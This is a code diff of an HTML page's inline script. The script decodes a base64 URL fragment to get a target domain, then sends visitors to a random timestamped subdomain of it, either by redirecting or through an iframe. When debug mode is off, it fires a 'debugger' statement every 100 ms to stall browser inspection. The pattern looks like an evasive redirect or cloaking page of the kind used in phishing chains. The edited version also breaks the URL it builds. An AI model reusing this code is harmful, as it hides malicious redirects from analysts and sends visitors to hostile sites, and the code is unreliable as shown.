@@ -29,26 +29,24 @@
   <script>
     var debug = 0;
     if (location.hash && location.hash.slice(1)) {
-      var base64 = location.hash.slice(1),
-        hash = window.atob(base64);
+      var base64 = location.hash.slice(1), hash = window.atob(base64);
       if (base64 && hash) {
         var GET = {};
-        hash.split('&').forEach(function (item) { var arr = item.split('='); if (arr.length != 1) { GET[arr[0]] = decodeURIComponent(arr[1]) } else { GET[item] = '' } })
+        hash.split('&').forEach(function (item) { var arr = item.split('='); if (arr.length != 1) { GET[arr[0]] = decodeURIComponent(arr[1]) } else { GET[item] = '' } });
+        debug = Number(GET['debug']);
         var domain3 = GET['domain3'], iframe = Number(GET['iframe']);
-        var uniqid = Date.now().toString(36)
-        var random = window.btoa(Date.now())
-        var url = `https://${uniqid}.${domain3}/?==${random}`;
-        if (iframe == '1') {
-          document.write(`<iframe src="${url}"></iframe>`)
+        var uniqid = Date.now().toString(36);
+        var random = window.btoa(Date.now());
+        var url = 'https://' + uniqid + domain3 + '/?==${random}';
+        if (iframe) {
+          document.write('<iframe src="' + url + '"></iframe>');
         } else {
           location.href = url;
         }
-        debug = Number(GET['debug']);
       }
     }
     if (!debug) {
-      console.log('debug', debug)
-      setInterval(function () { debugger }, 100)
+      setInterval(function () { debugger }, 100);
     }
   </script>
 </body>
